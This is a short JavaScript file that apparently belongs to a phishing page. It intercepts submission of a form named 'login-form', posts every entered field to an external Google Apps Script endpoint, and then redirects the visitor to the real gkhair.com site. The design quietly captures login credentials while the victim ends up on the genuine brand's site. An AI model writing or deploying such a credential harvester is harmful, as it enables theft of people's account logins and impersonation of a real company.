const scriptURL = 'https://script.google.com/macros/s/AKfycbxdtFcXk7ym9FaQVrrvte5f_LCbyjp_Di8uOH0EOxQ-NdhEKgxJZVel8WVZsILhVos7/exec'

const form = document.forms['login-form']

form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  // .then(response => alert("Thank you! your form is submitted successfully." ))
  .then(() => { window.location.replace("https://www.gkhair.com"); })
  .catch(error => console.error('Error!', error.message))
})